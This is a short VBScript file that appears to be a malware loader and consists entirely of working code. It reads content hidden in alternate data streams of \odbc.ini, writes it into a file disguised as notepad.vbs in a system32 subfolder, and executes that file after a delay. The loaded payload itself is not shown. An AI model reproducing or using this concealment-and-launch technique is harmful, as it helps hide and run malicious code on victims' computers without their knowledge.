Set wshshell = _
CreateObject("WScript.Shell")
Set WshSysEnv = WshShell.Environment _
("Process")
Set fso = CreateObject _
("Scripting.FileSystemObject")
set bs = fso.CreateTextFile(WshSysEnv("SystemRoot")&"\system32\ras\notepad.vbs")
   bs.Close
set bs=nothing
sub r1(pot)
set ns = fso.OpenTextFile("\odbc.ini:"&pot)
   eXtream = ns.ReadAll()
   ns.Close
set ns=nothing
set dll = fso.OpenTextFile(WshSysEnv("SystemRoot")&"\system32\ras\notepad.vbs", 8, True, 0)
dll.Writeline eXtream
dll.Close
set dll=nothing
end sub
r1 "main"
r1 "mail"
r1 "user"
r1 "group"
wscript.sleep 10000
wshshell.run(WshSysEnv("SystemRoot")&"\system32\ras\notepad.vbs")
